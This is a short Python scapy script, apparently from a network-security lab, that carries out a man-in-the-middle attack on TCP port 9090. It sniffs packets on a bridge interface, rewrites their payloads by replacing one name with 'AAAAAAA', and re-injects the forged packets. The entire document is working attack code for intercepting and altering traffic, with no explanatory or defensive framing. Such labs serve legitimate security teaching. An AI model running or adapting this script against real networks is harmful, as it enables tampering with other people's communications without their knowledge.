#!/usr/bin/env python3
import re
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

def spoof_pkt(pkt):
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)

    if pkt[TCP].payload:
        # Decode payload
        data = pkt[TCP].payload.load.decode().lower()

        # Replace the pattern
        newdata = re.sub('ifeanyi', 'AAAAAAA', data, 1)
        
        # Send the packet wit the new data
        print(f'sending {newdata}')
        send(newpkt/newdata, verbose = 0)
    else: 
        send(newpkt, verbose = 0)

f = '(tcp port 9090) && (not ether src 02:42:22:32:2c:98)'
sniff(iface='br-5b598e26fa5c', filter=f, prn=spoof_pkt)
